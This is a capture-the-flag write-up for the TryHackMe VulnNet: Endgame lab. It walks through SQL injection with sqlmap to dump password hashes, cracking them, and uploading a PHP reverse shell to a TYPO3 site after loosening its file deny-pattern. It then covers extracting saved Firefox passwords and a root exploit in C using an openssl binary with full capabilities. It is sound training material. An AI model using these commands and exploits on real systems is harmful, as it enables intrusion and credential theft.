---
date: 2025-01-08
categories: [CTF, THM]
title: "THM - VulnNet: Endgame"
tags: ['john the ripper', 'linux', 'linux capabilities', 'linux setuid', 'nmap', 'privilege escalation', 'python', 'rce', 'reverse shell', 'sqli']

description: "VulnNet Endgame - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# THM - VulnNet: Endgame

NMAP

![image1](../resources/368ddbe377084accadfb9b4c10ec6348.png)


![image2](../resources/3e764009d6424477b80e008cff35dd0b.png)

Add vulnnet.thm to /etc/hosts


![image3](../resources/bad83b54c81247728659b832c488787c.png)

- <u>Subdomain enumeration:</u>

```bash
wfuzz -v -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://vulnnet.thm -H "Host:FUZZ.vulnnet.thm" --hw 9

```
There is a bug when the width of the shown line is bigger than the screen. hc/hw/hh - all those don't work. Make the terminal as big as the output.


![image4](../resources/f36e04a9f95a4591be122cf26b298cc7.png)

Add them to /etc/hosts:


![image5](../resources/dd32eef4b8c740a4a293659d23f290a4.png)

Directory bruteforce on admin1.vulnnet.thm:


![image6](../resources/5dd3be1f2daa463cae5dfc8bcd4a85e0.png)


![image7](../resources/2bc89546c9d4435fa1a69a0605db5b34.png)

/fileadmin


![image8](../resources/502b4002c9594a60b77f6ced82d72af6.png)

/typo3 - Found the CMS


![image9](../resources/64f5401003054625bba5aa505df8552b.png)

/typo3conf


![image10](../resources/35910c4fb9f247f0a15ea7370ba03128.png)

- Looking at the first blog's source:

![image11](../resources/929feddb106c4f319a8fd7ae7e9560f3.png)

`http:// api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1`


![image12](../resources/ea0e7378fc9c41d99f078bdda6676893.png)

You can change blog=


![image13](../resources/2ff67671a9cf4416bfaeb17e9da781ec.png)

Check for SQLi


![image14](../resources/33b007fd3cfe46f6a70034fe7b30b32e.png)

0r 1=1 -- works - SQLi proved

**<u>SQLMap</u>**

- **Open burp and catch the request (with parameters ie. blog=1)**


![image15](../resources/9e6fe0d33a444757b19b783406a47698.png)

- **Save the request text to a file**
\#Or use the URL - but this way is better when POST requests are being used


![image16](../resources/70dd44a9d5034da39831800f4beed438.png)

- **Dump databases' names**

```bash
msqlmap -r request --batch --dbs

```

![image17](../resources/bf281e5fad0e4eb0a6169f8c6d40e4db.png)

- **Dump tables for database vn_admin**
  
```bash
sqlmap -r request --batch -D vn_admin --tables

```

![image18](../resources/025069d7572e499bb4b828bd0141e780.png)

- **Dump columns for table be_users**
  
```bash
sqlmap -r request --batch -D vn_admin -T be_users --columns

```

![image19](../resources/aaf6c6c7d29044bc853ba56dca3bb30b.png)

- **Dump username and password columns**
  
```bash
sqlmap -r request --batch -D vn_admin -T be_users -C username,password --dump

```

![image20](../resources/281739d5dec9475eacd6f9106f6fe706.png)

user: **chris_w**

pass: **\$argon2i\$v=19\$m=65536,t=16,p=2\$UnlVSEgyMUFnYnJXNXlXdg\$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg**

Hash is in **argon2** format:

Attempted to crack it with a python script - Argon2_Cracker but it took too long and crashed

- Do the same for blog database:
  
```bash
sqlmap -r request --batch -D blog --tables

sqlmap -r request --batch -D blog -T users --columns

sqlmap -r request --batch -D blog -T users -C username,password,id --dump

```

![image21](../resources/36619d94d1204ee5882f32500a05cd9e.png)

- Or just do:
  
```bash
sqlmap -r request --batch --dump-all --exclude-sysdb

```
The output is in:

```bash
~/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv

```

![image22](../resources/3cba2a42a6fe4189aa944ae4ba62615c.png)

- I used the program I made and split the csv to get the passwords column and save in **pass.txt**

- Crack, the hash found before, with john:
  
```bash
john hash_argon --wordlist=pass.txt

```

![image23](../resources/6a804ca618c149ce8d719c4c7eb14525.png)

**chris_w : vAxWtmNzeTz**

- Login to the CMS with the credentials:

![image24](../resources/25e2f12c1e2e462384937fd736f9e6aa.png)

- We can see chris_w is an admin


![image25](../resources/74a185b497424d15ab1258530ccbbee1.png)

- To get a shell:
<https://exploit-notes.hdks.org/exploit/web/cms/typo3-pentesting/>


![image26](../resources/2973f5844bef4c028bc5d1f4888c886d.png)

\*ADMIN TOOLS -\> \*Settings -\>Configure Installation Wide Options...


![image27](../resources/200a7e4e66564d288dbb7b08a323d860.png)

Replace the line in there with:

```bash
\.(phpsh|phtml|pht|phar|shtml|cgi)(\..*)?$|\.pl$|^\.htaccess$

```
Download a php reverse shell:  
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php

```
and change the IP and PORT

Upload the file:

Go to "FILE" → "Filelist" and upload the payload to the root of /fileadmin

Create a listener:

```bash
rlwrap -cAr nc -lvnp 4443

```
Go to:

`http:// admin1.vulnnet.thm/fileadmin/shell.php`

Shell:


![image28](../resources/1a71d122ad3c4e089eb45767c3ce9ed6.png)


![image29](../resources/6542ae11395f4f18800169be111a834d.png)


![image30](../resources/ec4d7836be3b442798ea9a2db8c24f81.png)

There is a .mozilla directory


![image31](../resources/6b1a02cfda6040f7bdc762e1fb0e86ad.png)

Firefox profiles can be extracted for passwords

<https://github.com/unode/firefox_decrypt>

- Use python3 http.server to copy the directories over to Kali

![image32](../resources/d988abb88d034239a0a7dba664a0ba4b.png)

Run firefox_decrypt.py and put the directory that profiles.ini is in:

```bash
python3 firefox_decrypt.py 10.10.226.37:8083

```
- The problem is that the .ini file doesn't show all three profiles:

![image33](../resources/48b4cf49857b45d8b4a5e1de99b91c1b.png)


![image34](../resources/944fe6e20b66402b9b518d4c49006969.png)

Edit the .ini file:


![image35](../resources/359acd7dd6fd4fb9a0a6398bd58d7b7c.png)

**2fjnrwth.default-release has logins.json file which is needed**

Run it again and choose 1:


![image36](../resources/2a135910dd1043d0b1520b30bef36d97.png)

Website: <https://tryhackme.com>

Username: 'chris_w@vulnnet.thm'

Password: '**8y7TKQDpucKBYhwsb**'

Since this was found in system's home folder:

```bash
su system

```
Enter password above


![image37](../resources/30e881c29e3d4154ba1d0da693a45423.png)


![image38](../resources/1d34ac1ebf43439eac1d6bacbfc2ee31.png)

We can now use ssh instead:

```bash
ssh system@10.10.32.43

```

![image39](../resources/69613d79c27e48ccb66219f9cdbb9406.png)

- Looking at the capabilities:

```bash
getcap -r / 2>/dev/null

```

![image40](../resources/87a7a15f834e4e1b9149a65dede9b274.png)

The first line:

```bash
/home/system/Utils/openssl =ep

```
The capability **=ep** means the binary has **all capabilities**

**Exploit:**

<https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/openssl-privilege-escalation/>

Steps to exploit:

- Download the c libraries (on Kali):
  
```bash
sudo apt install libssl-dev

```
- Create "exploit.c"

```bash
#include <openssl/engine.h>
#include <stdlib.h>
#include <unistd.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 1; // Add a return value to match expected function signature
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

- Now compile it using gcc:
  
```bash
gcc -fPIC -o exploit.o -c exploit.c
gcc -shared -o exploit.so -lcrypto exploit.o

```
- Transfer from Kali to victim machine (with python)
  
```bash
chmod +x exploit.so
```

- Use the full path to openssl (as in getcap):
  
```bash
/home/system/Utils/openssl req -engine ./exploit.so

```

![image41](../resources/5e2e5afbfc604633bd895649c68bd3d3.png)

```bash
cat root.txt

```
